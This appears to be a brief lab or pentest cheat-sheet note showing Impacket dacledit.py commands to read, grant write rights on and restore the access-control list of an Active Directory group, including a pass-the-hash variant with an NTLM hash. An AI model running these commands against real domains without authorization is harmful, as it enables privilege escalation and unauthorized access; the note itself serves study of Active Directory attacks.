
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD>
```
![[Pasted image 20251230130204.png]]
#### Modifying Luna's DACLs over the Finance group
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD> -action write
```

![[Pasted image 20251230130231.png]]
**Example using hashes**:
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER> -hashes :fa61a89e878f8688afb10b515a4866c7 -action write
```
#### Querying Luna's DACLs over the Finance Group after Modification
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD>
```
![[Pasted image 20251230130323.png]]
#### Restoring the DACL using the Backup File
like cleaning up
```shell
dacledit.py -principal <USER> -target "<GROUP>" -dc-ip <TARGET-IP> DOMAIN.local/<USER>:<PASSWORD> -action restore -file dacledit-20230524-211441.bak
```